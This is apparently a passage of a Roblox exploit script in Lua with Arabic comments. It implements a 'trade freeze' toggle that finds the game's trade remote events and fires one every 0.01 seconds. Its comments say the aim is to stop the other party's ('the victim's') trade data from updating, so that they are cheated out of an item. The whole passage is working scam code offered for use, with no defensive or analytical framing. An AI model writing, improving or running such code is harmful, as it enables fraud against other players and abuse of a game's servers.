--- [ نظام البرمجة والربط بالسيرفر ] ---
local ReplicatedStorage = game:GetService("ReplicatedStorage")
-- البحث عن ريموتات التريد في ماب عالم المملكة تلقائياً
local TradeRemote = ReplicatedStorage:FindFirstChild("TradeRemote") or ReplicatedStorage:FindFirstChild("AcceptTrade") or ReplicatedStorage:FindFirstChild("UpdateTrade")

local isFreezing = false

ActionButton.MouseButton1Click:Connect(function()
    isFreezing = not isFreezing
    
    if isFreezing then
        -- تغيير الشكل للوضع النشط (الأخضر النيون الفخم)
        StatusFrame.BackgroundColor3 = Color3.fromRGB(40, 160, 90)
        StatusLabel.Text = "STATUS: PACKET INJECTED ✔"
        
        ActionButton.BackgroundColor3 = Color3.fromRGB(30, 120, 70)
        ActionButton.Text = "INJECTING ACTIVE..."
        
        -- تشغيل الثغرة وتثبيت الموتر بالتريد فوراً
        task.spawn(function()
            while isFreezing do
                if TradeRemote then
                    TradeRemote:FireServer(true)
                end
                task.wait(0.01) -- سرعة فائقة تمنع تحديث البيانات عند الضحية
            end
        end)
    else
        -- العودة للوضع العادي
        StatusFrame.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
        StatusLabel.Text = "STATUS: BYPASS STANDBY"
        
        ActionButton.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
        ActionButton.Text = "FREEZE NETWORK DATA"
    end
end)
